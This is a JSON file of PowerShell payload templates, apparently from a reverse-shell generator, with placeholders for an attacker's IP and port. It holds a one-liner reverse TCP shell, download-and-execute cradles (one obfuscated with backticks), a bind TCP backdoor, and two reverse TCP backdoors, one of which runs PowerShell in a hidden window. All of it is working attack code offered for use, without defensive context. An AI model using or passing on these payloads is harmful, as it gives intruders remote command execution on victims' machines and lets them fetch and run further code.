[
  {
    "name": "One-liner",
    "template": "$client = New-Object System.Net.Sockets.TCPClient('{{ip}}',{{port}});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex \". { $data } 2>&1\" | Out-String);$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback + 'PS ' + (pwd).Path + '> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
  },
  {
    "name": "Download",
    "template": "powershell IEX(New-Object Net.WebClient).downloadstring(\"http://{{ip}}:{{port}}/Item-Name\")\n\n(New-Object Net.WebClient).DownloadFile(\"http://{{ip}}:{{port}}/Item-Name\", \"Out-File-Name\")\n\n# Obfuscate\n\n& (`G`C`M *ke-E*) '(& (`G`C`M *ew-O*) `N`E`T`.`W`E`B`C`L`I`E`N`T).\"`D`O`W`N`L`O`A`D`F`I`L`E\"(\"http://{{ip}}:{{port}}/Item-Name\", \"Out-File-Name\")'"
  },
  {
    "name": "Bind TCP - Invoke-Expression",
    "template": "PowerShell -Command \"'{{port}}'\" | PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand  $p = $(Read-Host -Prompt \"Enter port number\").Trim(); Write-Host \"\"; if ($p.Length -lt 1) { Write-Host \"Port number is required\"; } else { Write-Host \"PowerShell Bind TCP v4.0 by Ivan Sincek.`nGitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.\"; $l = $c = $s = $b = $w = $d = $r = $null; try { $l = New-Object Net.Sockets.TcpListener(\"0.0.0.0\", $p); $l.Start(); Write-Host \"Backdoor is up and running...`n`nWaiting for client to connect...`n\"; do { if ($l.Pending()) { $c = $l.AcceptTcpClient(); } else { Start-Sleep -Milliseconds 500; } } while ($c -eq $null); $l.Stop(); $s = $c.GetStream(); $b = New-Object Byte[] 1024; $e = New-Object Text.UTF8Encoding; $w = New-Object IO.StreamWriter($s, [Text.Encoding]::UTF8, 1024); $w.AutoFlush = $true; Write-Host \"Client has connected!`n\"; $by = 0; do { $w.Write(\"PS>\"); do { $by = $s.Read($b, 0, $b.Length); if ($by -gt 0) { $d += $e.GetString($b, 0, $by); } } while ($s.DataAvailable); if ($by -gt 0) { $d = $d.Trim(); if ($d.Length -gt 0) { try { $r = Invoke-Expression -Command $d 2>&1 | Out-String; } catch { $r = $_.Exception | Out-String; } Clear-Variable d; if ($r.Length -gt 0) { $w.Write($r); Clear-Variable r; } } } } while ($by -gt 0); Write-Host \"Client has disconnected!\"; } catch { Write-Host $_.Exception.InnerException.Message; } finally { if ($l -ne $null) { $l.Server.Close(); $l.Server.Dispose(); Clear-Variable l; } if ($w -ne $null) { $w.Close(); $w.Dispose(); Clear-Variable w; } if ($s -ne $null) { $s.Close(); $s.Dispose(); Clear-Variable s; } if ($c -ne $null) { $c.Close(); $c.Dispose(); Clear-Variable c; } if ($b -ne $null) { $b.Clear(); Clear-Variable b; } if ($r -ne $null) { Clear-Variable r; } if ($d -ne $null) { Clear-Variable d; } [GC]::Collect(); } } Clear-Variable p;"
  },
  {
    "name": "Reverse TCP - Process Pipes",
    "template": "PowerShell -Command \"'{{ip}}', '{{port}}'\" | PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand $a = $(Read-Host -Prompt \"Enter address\").Trim(); Write-Host \"\"; $pt = $(Read-Host -Prompt \"Enter port number\").Trim(); Write-Host \"\"; if ($a.Length -lt 1 -or $pt.Length -lt 1) { Write-Host \"Both parameters are required\"; } else { Write-Host \"PowerShell Reverse TCP v4.0 by Ivan Sincek.`nGitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.\"; $c = $s = $b = $w = $p = $e = $o = $ee = $oe = $null; try { $c = New-Object Net.Sockets.TcpClient($a, $pt); $s = $c.GetStream(); $s.ReadTimeout = 5; $b = New-Object Byte[] 1024; $w = New-Object IO.StreamWriter($s, [Text.Encoding]::UTF8, 1024); $w.AutoFlush = $true; $p = New-Object Diagnostics.Process; $p.StartInfo = New-Object Diagnostics.ProcessStartInfo; $p.StartInfo.FileName = \"powershell\"; $p.StartInfo.CreateNoWindow = $true; $p.StartInfo.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden; $p.StartInfo.UseShellExecute = $false; $p.StartInfo.RedirectStandardInput = $p.StartInfo.RedirectStandardError = $p.StartInfo.RedirectStandardOutput = $true; $p.StartInfo.ErrorDialog = $false; $p.EnableRaisingEvents = $false; $e = New-Object Text.StringBuilder; $o = New-Object Text.StringBuilder; $sb = { if ($EventArgs.Data.Length -gt 0) { $Event.MessageData.AppendLine($EventArgs.Data); } }; $ee = Register-ObjectEvent -InputObject $p -EventName \"ErrorDataReceived\" -Action $sb -MessageData $e; $oe = Register-ObjectEvent -InputObject $p -EventName \"OutputDataReceived\" -Action $sb -MessageData $o; $p.Start() | Out-Null; $p.BeginErrorReadLine(); $p.BeginOutputReadLine(); Write-Host \"Backdoor is up and running...`n\"; while (!$p.HasExited) { try { $by = $s.Read($b, 0, $b.Length); if ($by -gt 0) { $p.StandardInput.Write($b, 0, $by); } else { break; } } catch [Management.Automation.MethodInvocationException] {} if ($e.Length -gt 0) { $w.Write($o.ToString()); $o.clear(); } if ($o.Length -gt 0) { $w.Write($o.ToString()); $o.clear(); } } Write-Host \"Backdoor will now exit...\"; } catch { Write-Host $_.Exception.InnerException.Message; } finally { if ($ee -ne $null) { Unregister-Event -SourceIdentifier $ee.Name; Clear-Variable ee; } if ($oe -ne $null) { Unregister-Event -SourceIdentifier $oe.Name; Clear-Variable oe; } if ($p -ne $null) { $p.Close(); $p.Dispose(); Clear-Variable p; } if ($w -ne $null) { $w.Close(); $w.Dispose(); Clear-Variable w; } if ($s -ne $null) { $s.Close(); $s.Dispose(); Clear-Variable s; } if ($c -ne $null) { $c.Close(); $c.Dispose(); Clear-Variable c; } if ($b -ne $null) { $b.Clear(); Clear-Variable b; } if ($e -ne $null) { $e.Clear(); Clear-Variable e; } if ($o -ne $null) { $o.Clear(); Clear-Variable o; } [GC]::Collect(); } } Clear-Variable a; Clear-Variable pt;"
  },
  {
    "name": "Reverse TCP - Invoke-Expression",
    "template": "PowerShell -Command \"'{{ip}}', '{{port}}'\" | PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand $a = $(Read-Host -Prompt \"Enter address\").Trim(); Write-Host \"\"; $p = $(Read-Host -Prompt \"Enter port number\").Trim(); Write-Host \"\"; if ($a.Length -lt 1 -or $p.Length -lt 1) { Write-Host \"Both parameters are required\"; } else { Write-Host \"PowerShell Reverse TCP v4.0 by Ivan Sincek.`nGitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.\"; $c = $s = $b = $w = $d = $r = $null; try { $c = New-Object Net.Sockets.TcpClient($a, $p); $s = $c.GetStream(); $b = New-Object Byte[] 1024; $e = New-Object Text.UTF8Encoding; $w = New-Object IO.StreamWriter($s, [Text.Encoding]::UTF8, 1024); $w.AutoFlush = $true; Write-Host \"Backdoor is up and running...`n\"; $by = 0; do { $w.Write(\"PS>\"); do { $by = $s.Read($b, 0, $b.Length); if ($by -gt 0) { $d += $e.GetString($b, 0, $by); } } while ($s.DataAvailable); if ($by -gt 0) { $d = $d.Trim(); if ($d.Length -gt 0) { try { $r = Invoke-Expression -Command $d 2>&1 | Out-String; } catch { $r = $_.Exception | Out-String; } Clear-Variable d; if ($r.Length -gt 0) { $w.Write($r); Clear-Variable r; } } } } while ($by -gt 0); Write-Host \"Backdoor will now exit...\"; } catch { Write-Host $_.Exception.InnerException.Message; } finally { if ($w -ne $null) { $w.Close(); $w.Dispose(); Clear-Variable w; } if ($s -ne $null) { $s.Close(); $s.Dispose(); Clear-Variable s; } if ($c -ne $null) { $c.Close(); $c.Dispose(); Clear-Variable c; } if ($b -ne $null) { $b.Clear(); Clear-Variable b; } if ($r -ne $null) { Clear-Variable r; } if ($d -ne $null) { Clear-Variable d; } [GC]::Collect(); } } Clear-Variable a; Clear-Variable p;"
  }
]
